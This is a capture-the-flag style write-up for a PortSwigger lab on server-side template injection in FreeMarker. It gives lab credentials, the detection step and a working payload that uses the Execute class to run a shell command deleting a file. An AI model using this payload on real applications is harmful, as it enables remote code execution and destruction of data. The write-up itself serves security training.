# Lab 03 — Server-side template injection using documentation

> **Practitioner** · [Official lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

**Entry point:** product description template editor (`content-manager:C0nt3ntM4n4g3r`)
· **Engine:** FreeMarker.

## Solution

1. Detect — save an invalid expression (`${foobar}`) as the description; the
   error reveals **FreeMarker**.
2. Read the docs: FreeMarker's `new()` built-in instantiates arbitrary
   `TemplateModel` classes — and `freemarker.template.utility.Execute` runs
   shell commands.
3. Exploit — set the description to:

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

4. Save, then view the product page — the command runs — lab solved.

## Notes

"Read the documentation" is not a joke: dangerous built-ins (`new`, `assign`)
and known implementing classes are the documented path from SSTI to RCE.
